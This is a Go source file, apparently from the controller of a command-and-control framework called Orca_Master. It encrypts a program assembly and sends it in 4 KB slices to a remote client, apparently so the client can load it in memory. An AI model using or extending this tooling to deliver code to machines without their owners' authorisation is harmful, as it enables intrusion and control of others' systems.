package assemblyopt

import (
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/tools/crypto"
	"Orca_Master/tools/util"
	"encoding/json"
	"fmt"
	"github.com/tj/go-spin"
	"io"
	"os"
	"path/filepath"
	"time"
)

const SliceBytes = 4 * 1024 // 分片大小

type AssemblyMetaInfo struct {
	Fid        string // 操作文件ID，随机生成的UUID
	FileName   string // 程序名
	SliceNum   int    // 基础分片数量
	SliceSize  int64  // 基础分片大小
	RemainSize int64  // 剩余分片大小
}

// 获取程序集元信息，并加密
func GetAssemblyMetaInfo(uploadFile string) string {
	sliceNum, remainSize := fileopt.GetFileSliceInfo(uploadFile)
	_, filename := filepath.Split(uploadFile)
	sliceSize := int64(SliceBytes)
	assemblyMetaInfo := AssemblyMetaInfo{
		Fid:        util.GenUUID(),
		FileName:   filename,
		SliceNum:   sliceNum,
		SliceSize:  sliceSize,
		RemainSize: remainSize,
	}
	metaInfo, err := json.Marshal(assemblyMetaInfo)
	if err != nil {
		return ""
	}
	data, _ := crypto.Encrypt(metaInfo, []byte(config.AesKey))
	return data
}

// 发送程序集元信息
func SendAssemblyMetaMsg(clientId, metaData string) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "assemblyLoad"
	data := metaData
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data)
	return retData
}

// 发送程序集分片数据
func SendAssemblySliceMsg(clientId string, sliceData []byte) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "assemblySliceData"
	data, _ := crypto.Encrypt(sliceData, []byte(config.AesKey))
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data)
	return retData
}

// 发送文件
func SendFileData(clientId string, uploadFile string) {
	sliceNum, remainSize := fileopt.GetFileSliceInfo(uploadFile)
	sliceSize := int64(SliceBytes)
	pUploadFile, _ := os.Open(uploadFile)
	defer pUploadFile.Close()
	s := spin.New()
	s.Set(spin.Box2)
	currentTime := time.Now().Format("2006/01/02 15:04:05")
	timeSign := colorcode.COLOR_GREY + currentTime + colorcode.END
	sign := fmt.Sprintf("%s %s", timeSign, colorcode.SIGN_NOTICE)
	for i := 0; i < sliceNum; i++ {
		fmt.Printf("\r%s%s assembly loading\033[m %s ", sign, colorcode.COLOR_CYAN, s.Next())
		sliceData := make([]byte, sliceSize)
		_, err := pUploadFile.Read(sliceData)
		if err != nil && err != io.EOF {
			panic(err.Error())
		}
		SendAssemblySliceMsg(clientId, sliceData)
	}
	// 处理最后一个分片
	sliceData := make([]byte, remainSize)
	_, err := pUploadFile.Read(sliceData)
	if err != nil && err != io.EOF {
		panic(err.Error())
	}
	SendAssemblySliceMsg(clientId, sliceData)
	fmt.Println()

}
